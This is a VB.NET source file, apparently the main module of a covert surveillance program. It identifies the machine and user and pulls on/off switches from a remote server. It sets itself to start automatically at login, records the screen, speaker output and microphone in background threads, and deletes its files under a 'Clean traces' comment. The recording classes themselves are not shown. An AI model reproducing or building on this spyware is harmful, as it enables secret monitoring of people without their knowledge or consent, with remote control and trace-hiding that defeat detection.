#Region "References"

Imports System.IO
Imports System.Net
Imports System.Net.Cache
Imports System.Xml
Imports System.Text
Imports System.Threading
Imports System.Globalization

Imports NAudio.Wave
Imports Microsoft.Win32

#End Region

Module MainModule

    Private _appMutex As Mutex

    Public Sub Main()

        '---------------------------------------------------------
        'Check app process instances
        '---------------------------------------------------------

        Dim isAppSingleInstance As Boolean
        _appMutex = New Mutex(True, "e955082e-9869-4c45-a0ca-f5034e93cb92", isAppSingleInstance)

        If Not isAppSingleInstance Then
            Environment.Exit(-1)
            Return
        End If

        '---------------------------------------------------------
        'Remove old data
        '---------------------------------------------------------

        CleanOldData()

        '---------------------------------------------------------
        'Set app culture info
        '---------------------------------------------------------

        CultureInfo.DefaultThreadCurrentCulture = New CultureInfo("en-US")
        CultureInfo.DefaultThreadCurrentUICulture = New CultureInfo("en-US")

        '---------------------------------------------------------
        'Get computer ID
        '---------------------------------------------------------

        Try
            ComputerId = String.Concat(Environment.MachineName.Replace(" ", ""), "-", Environment.UserName.Replace(" ", ""), "-", Environment.OSVersion.Version.Major, "-", Environment.OSVersion.Version.Minor, "-", Environment.OSVersion.Version.Build).Trim
        Catch ex As Exception
            ComputerId = Path.GetRandomFileName.Replace(".", "").Trim
        End Try

        '---------------------------------------------------------
        'Retrieve remote instructions
        '---------------------------------------------------------

        GetRemoteConfig()

        If Not MonitorEnabled Then
            Environment.Exit(-1)
            Return
        End If

        '---------------------------------------------------------
        'Session ending handlers
        '---------------------------------------------------------

        AddHandler SystemEvents.SessionEnding, AddressOf SessionEndingHandler
        AddHandler SystemEvents.SessionEnded, AddressOf SessionEndedHandler

        '---------------------------------------------------------
        'Enable automatic start on user login
        '---------------------------------------------------------

        EnableAutoStart()

        '---------------------------------------------------------
        '                   Screen recording
        '---------------------------------------------------------

        If ScreenRecorderEnabled Then

            Task.Run(Function()

                         Thread.CurrentThread.Priority = ThreadPriority.BelowNormal

                         Dim myScreenRecorder = New ScreenRecorder
                         myScreenRecorder.StartRecording()

                         Return True

                     End Function)

        End If

        '---------------------------------------------------------
        '                   Audio output recording
        '---------------------------------------------------------

        If SpeakersRecorderEnabled Then

            Task.Run(Function()

                         Thread.CurrentThread.Priority = ThreadPriority.BelowNormal

                         Dim speakersRecorder = New AudioOutputRecorder
                         speakersRecorder.StartRecording()

                         Return True

                     End Function)

        End If

        '---------------------------------------------------------
        '                   Audio input recording
        '---------------------------------------------------------

        If MicRecorderEnabled Then

            Dim waveInDevCount As Integer = WaveIn.DeviceCount
            Dim waveInDevIndex As Integer = -1

            For waveInDev = 0 To waveInDevCount - 1
                waveInDevIndex = waveInDev
                Exit For
            Next

            If waveInDevIndex > -1 Then

                Task.Run(Function()

                             Thread.CurrentThread.Priority = ThreadPriority.BelowNormal

                             Dim micRecorder = New AudioInputRecorder(waveInDevIndex)
                             micRecorder.StartRecording()

                             Return True

                         End Function)

            End If

        End If

        If Not ScreenRecorderEnabled AndAlso Not SpeakersRecorderEnabled AndAlso Not MicRecorderEnabled Then
            Environment.Exit(-1)
            Return
        End If

        While Not IsAppExit
            Thread.Sleep(1000)
        End While

        ExitApp()

    End Sub

#Region "Event handlers"

    Private Sub SessionEndingHandler(sender As Object, e As SessionEndingEventArgs)
        IsAppExit = True
    End Sub

    Private Sub SessionEndedHandler(sender As Object, e As SessionEndedEventArgs)
        IsAppExit = True
    End Sub

#End Region

#Region "Helper Methods"

    Private Sub GetRemoteConfig()

        Dim osVersion As Version

        Try
            osVersion = New Version(Environment.OSVersion.Version.Major, Environment.OSVersion.Version.Minor, Environment.OSVersion.Version.Build)
        Catch ex As Exception
            osVersion = New Version(10, 0, 19041)
        End Try

        Try

            'Use your own script to communicate with the client app

            Dim serverUri = New Uri("https://www.mysite.com/server.php?v=" & My.Application.Info.Version.ToString & "&os=" & osVersion.ToString(2) & "&x64=" & Environment.Is64BitOperatingSystem.ToString(CultureInfo.InvariantCulture), UriKind.Absolute)

            Dim serverRequest = DirectCast(WebRequest.Create(serverUri), HttpWebRequest)

            serverRequest.Timeout = 30000
            serverRequest.Method = "GET"
            serverRequest.CachePolicy = New HttpRequestCachePolicy(HttpRequestCacheLevel.NoCacheNoStore)
            serverRequest.UserAgent = USER_AGENT

            Dim serverResponse As HttpWebResponse = CType(serverRequest.GetResponse(), HttpWebResponse)

            If serverResponse.StatusCode = HttpStatusCode.OK Then

                Using rs = serverResponse.GetResponseStream()

                    Using sr = New StreamReader(rs, Encoding.UTF8, True)

                        Dim xmlDocConfig As New XmlDocument With {.XmlResolver = Nothing}

                        Using xReader = XmlReader.Create(sr, New XmlReaderSettings() With {.XmlResolver = Nothing})
                            xmlDocConfig.Load(xReader)
                        End Using

                        For Each nodeConfig As XmlNode In xmlDocConfig.GetElementsByTagName("Config")

                            Try
                                MonitorEnabled = CBool(nodeConfig.Item("MonitorEnabled").InnerText.Trim)
                            Catch ex As Exception
                                'Do nothing
                            End Try

                            Try
                                ScreenRecorderEnabled = CBool(nodeConfig.Item("ScreenRecorderEnabled").InnerText.Trim)
                            Catch ex As Exception
                                'Do nothing
                            End Try

                            Try
                                SpeakersRecorderEnabled = CBool(nodeConfig.Item("SpeakersRecorderEnabled").InnerText.Trim)
                            Catch ex As Exception
                                'Do nothing
                            End Try

                            Try
                                MicRecorderEnabled = CBool(nodeConfig.Item("MicRecorderEnabled").InnerText.Trim)
                            Catch ex As Exception
                                'Do nothing
                            End Try

                        Next

                    End Using

                End Using

            End If

            serverResponse.Close()

        Catch ex As Exception
            'Do nothing
        End Try

    End Sub

    Private Sub ExitApp()

        EnableAutoStart()
        CleanOldData()

        If _appMutex IsNot Nothing Then _appMutex.Dispose()

    End Sub

    Private Sub CleanOldData()

        'Clean traces

        If Directory.Exists(DirRoot) Then

            For Each f In Directory.GetFiles(DirRoot, "*.*", SearchOption.AllDirectories)

                Try
                    File.Delete(f)
                Catch ex As Exception
                    'Do nothing
                End Try

            Next

        End If

    End Sub

#End Region

End Module